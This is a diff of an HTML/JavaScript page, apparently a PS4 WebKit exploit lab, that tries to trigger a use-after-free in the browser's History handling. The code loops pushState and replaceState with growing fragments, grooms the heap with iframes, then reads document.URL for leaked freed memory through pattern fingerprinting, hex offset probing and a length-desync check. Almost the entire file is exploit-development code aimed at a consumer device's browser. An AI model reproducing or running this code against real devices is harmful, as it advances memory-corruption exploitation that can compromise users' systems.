@@ -1,81 +1,68 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit Exploit Lab - UAF to Leak</title>
+<title>PS4 WebKit - UAF Analysis Suite</title>
 <style>
-    body { font-family: monospace; background:#000; color:#0f0; padding: 20px; }
-    .btn-group { margin-bottom: 20px; }
+    body { font-family: monospace; background:#000; color:#0f0; padding:20px; }
     button { 
-        font-size:14px; padding:12px; background: #222; color: #0f0; 
-        border: 1px solid #0f0; cursor: pointer; margin-right: 5px;
+        font-size:14px; padding:10px; margin:5px; 
+        background:#222; color:#0f0; border:1px solid #0f0; cursor:pointer;
     }
-    button:hover { background: #0f0; color: #000; }
-    #log { white-space: pre-wrap; border-top: 1px dashed #0f0; margin-top: 20px; padding-top: 10px; }
-    .highlight { color: #ff0; }
+    button:hover { background:#0f0; color:#000; }
+    #log { white-space: pre-wrap; border-top: 1px solid #333; margin-top: 20px; padding-top: 10px; }
+    .highlight { color: #fff; font-weight: bold; }
 </style>
 </head>
 <body>
+<h2>PS4 WebKit – UAF Analysis Suite</h2>
+<p>Status: <span id="status">Ready</span></p>
 
-<h2>PS4 WebKit Lab: HistoryItem UAF</h2>
-<div class="btn-group">
-    <button onclick="runTest('FINGERPRINT')">1. Passo A: Fingerprint</button>
-    <button onclick="runTest('WINDOWED')">2. Passo B: Windowed Read</button>
-    <button onclick="runTest('CONFUSION')">3. Passo C: Layout Confusion</button>
-</div>
+<button onclick="runStepA()">1. FINGERPRINT CHECK</button>
+<button onclick="runStepB()">2. WINDOWED READ (HEX)</button>
+<button onclick="runStepC()">3. LAYOUT LOGIC CHECK</button>
 
-<div id="log">Aguardando comando...</div>
+<div id="log"></div>
 
 <script>
 const logEl = document.getElementById("log");
-function log(m){ logEl.innerHTML += m + "\n"; }
+const statusEl = document.getElementById("status");
+
+function log(m){ logEl.textContent += m + "\n"; }
 function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
-// Padrão de identificação para o Passo A
-function getPattern(char, size) {
-    let chunk = char.repeat(8) + "0000"; 
-    return chunk.repeat(Math.floor(size / chunk.length));
+// Gera padrões para identificar a memória (Passo A)
+function getPattern(size, iter) {
+    let char = String.fromCharCode(0x41 + (iter % 26)); // A, B, C...
+    return char.repeat(size);
 }
 
-async function runTest(mode) {
+async function triggerBaseUAF() {
     logEl.textContent = "";
-    log(`=== MODO: ${mode} ===`);
+    statusEl.textContent = "Running UAF Phase...";
+    log("=== STARTING STABLE UAF (i < 48) ===");
 
     let size = 977;
     const STEP = 14461;
 
-    // --------------------------------------------------
-    // FASE 1 - Trigger (Mantendo seus valores originais)
-    // --------------------------------------------------
-    log("Disparando UAF no History...");
-    for(let i=0; i<48; i++) {
-        let frag;
-        if (mode === 'FINGERPRINT') {
-            // Alterna letras para mapear qual bloco será reusado
-            let char = String.fromCharCode(0x41 + (i % 26)); // A, B, C...
-            frag = getPattern(char, size);
-        } else {
-            frag = "A".repeat(size);
-        }
-
+    // Phase 1 – Fingerprinted UAF trigger
+    for(let i=0; i<48; i++){
+        let frag = getPattern(size, i); // Passo A: Inserindo marcas (A, B, C...)
         history.pushState({}, "", "#" + frag);
         history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
         
-        if(i % 6 === 0) setTimeout(() => history.back(), 0);
+        if(i % 6 === 0) setTimeout(()=>history.back(), 0);
+        
         size += STEP;
         await sleep(5);
     }
 
-    log("Aguardando janela UAF...");
+    log(">>> UAF WINDOW OPEN (Waiting 120ms) <<<");
     await sleep(120);
 
-    // --------------------------------------------------
-    // FASE 2 - Reuso (Heap Grooming com Iframes)
-    // --------------------------------------------------
-    log("Limpando/Reusando memória...");
+    // Phase 2 – Document reuse (Heap Grooming)
     let frames = [];
-    for(let i=0; i<80; i++) {
+    for(let i=0; i<80; i++){
         let f = document.createElement("iframe");
         document.body.appendChild(f);
         try {
@@ -86,58 +73,77 @@ async function runTest(mode) {
         } catch(e){}
         frames.push(f);
     }
-    frames.forEach(f => f.remove());
+    frames.forEach(f=>f.remove());
     frames = null;
+
     await sleep(80);
+    statusEl.textContent = "UAF Triggered - Analyzing...";
+}
 
-    // --------------------------------------------------
-    // FASE 3 - Análise Específica
-    // --------------------------------------------------
-    const leakedURL = document.URL;
-    const len = leakedURL.length;
-    log(`URL Length: <span class="highlight">${len}</span>`);
-
-    if (mode === 'FINGERPRINT') {
-        log("[ANALISANDO PADRÕES]");
-        // Procura por sequências de letras que injetamos na Fase 1
-        let found = false;
-        for(let j=0; j<26; j++) {
-            let char = String.fromCharCode(0x41 + j);
-            let pattern = char.repeat(8);
-            if (leakedURL.indexOf(pattern) !== -1) {
-                log(`FONTE DETECTADA: Bloco de caracteres <span class="highlight">${char}</span> encontrado no offset ${leakedURL.indexOf(pattern)}`);
-                found = true;
-            }
-        }
-        if(!found) log("Nenhum padrão antigo detectado. A memória foi limpa ou sobrescrita por dados novos.");
-    }
-
-    if (mode === 'WINDOWED') {
-        log("[LEITURA CIRÚRGICA - OFFSETS]");
-        let offsets = [0, 1000, 5000, 10000, 50000, 100000, 200000, len-1];
-        offsets.forEach(off => {
-            if (off < len) {
-                let code = leakedURL.charCodeAt(off);
-                let hex = code.toString(16).toUpperCase().padStart(4, '0');
-                log(`Offset [${off}]: CharCode=0x${hex} ('${String.fromCharCode(code & 0xFF)}')`);
-            }
-        });
-    }
-
-    if (mode === 'CONFUSION') {
-        log("[CONTROLE DE LAYOUT]");
-        let oldLen = document.URL.length;
-        location.hash = "SMALL"; 
-        log(`Novo hash setado para #SMALL`);
-        log(`Novo Length: ${document.URL.length}`);
-        if (document.URL.length === oldLen) {
-            log("<span class="highlight">ALERTA: O length não mudou! O ponteiro está preso no buffer antigo (UAF Confirmado).</span>");
-        } else {
-            log("O length mudou. O motor atualizou o ponteiro corretamente.");
+// --- PASSO A: FINGERPRINTING ---
+async function runStepA() {
+    await triggerBaseUAF();
+    log("\n[STEP A] Checking for Fingerprints...");
+    
+    let url = document.URL;
+    let found = false;
+    
+    // Procura por sequências de AAAA, BBBB, CCCC...
+    for(let i=0; i<26; i++) {
+        let pattern = String.fromCharCode(0x41 + i).repeat(10);
+        if(url.includes(pattern)) {
+            log("FOUND PATTERN: " + pattern.substring(0,4) + "... em offset: " + url.indexOf(pattern));
+            found = true;
         }
     }
+    
+    if(!found) log("No patterns found. Memory might be zeroed or differently mapped.");
+    log("=== END STEP A ===");
+}
 
-    log("=== FIM DO TESTE ===");
+// --- PASSO B: WINDOWED READ (PREVINE CRASH) ---
+async function runStepB() {
+    await triggerBaseUAF();
+    log("\n[STEP B] Windowed Read (Hex Probing)...");
+    
+    const offsets = [0, 1000, 5000, 10000, 50000, 100000, 200000, 300000];
+    let url = document.URL;
+    
+    log("URL Length: " + url.length);
+    
+    offsets.forEach(off => {
+        if(off < url.length) {
+            let code = url.charCodeAt(off);
+            log("Offset [" + off + "]: 0x" + code.toString(16).toUpperCase() + " (" + String.fromCharCode(code) + ")");
+        }
+    });
+    
+    log("=== END STEP B ===");
+}
+
+// --- PASSO C: LAYOUT LOGIC ---
+async function runStepC() {
+    await triggerBaseUAF();
+    log("\n[STEP C] Layout/Logic Collision Check...");
+    
+    let oldLen = document.URL.length;
+    log("Current Length: " + oldLen);
+    
+    log("Setting small location.hash...");
+    location.hash = "#TEST";
+    
+    await sleep(20);
+    let newLen = document.URL.length;
+    log("New Length: " + newLen);
+    
+    if(newLen > 1000 && location.hash === "#TEST") {
+        log("CRITICAL: document.URL.length desincronizado com o hash real!");
+        log("Isso confirma que o WebKit está lendo o buffer antigo (FREED).");
+    } else {
+        log("Length parece consistente.");
+    }
+    
+    log("=== END STEP C ===");
 }
 </script>
 </body>
